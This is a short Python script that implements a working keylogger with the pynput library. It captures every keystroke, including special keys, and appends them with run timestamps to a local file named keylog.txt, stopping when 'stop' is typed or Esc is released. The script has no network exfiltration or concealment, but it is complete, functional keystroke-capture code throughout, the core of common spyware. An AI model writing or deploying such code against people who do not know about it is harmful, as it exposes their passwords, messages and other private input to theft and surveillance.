from pynput import keyboard
import datetime

# Define the log file
LOG_FILE = "keylog.txt"

# Define a delimiter to separate different runs
DELIMITER = "\n" + "="*50 + "\n"

# Initialize a variable to store typed characters
typed_chars = ""

def on_press(key):
    """
    Function to handle key press events.
    Writes the pressed key to the log file and checks for the "stop" command.
    """
    global typed_chars
    try:
        # Capture the character pressed
        char = key.char
        
        # Append the typed character to typed_chars
        typed_chars += char
        
        # Write the character to the log file
        with open(LOG_FILE, "a") as file:
            file.write(f"{char}")
        
        # Check if the typed characters end with "stop"
        if typed_chars.lower().endswith("stop"):
            print("Stopping keylogger...")
            return False

    except AttributeError:
        # Handle special keys and log them
        with open(LOG_FILE, "a") as file:
            file.write(f"[{key}]")

def on_release(key):
    """
    Function to handle key release events.
    Stops the listener if the Esc key is pressed.
    """
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def start_keylogger():
    """
    Function to initialize and start the keylogger.
    Writes a delimiter and timestamp to the log file at the start.
    """
    # Write a delimiter and timestamp to the log file at the beginning of each run
    with open(LOG_FILE, "a") as file:
        file.write(DELIMITER)
        file.write(f"Started on {datetime.datetime.now()}\n")
    
    # Set up and start the keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
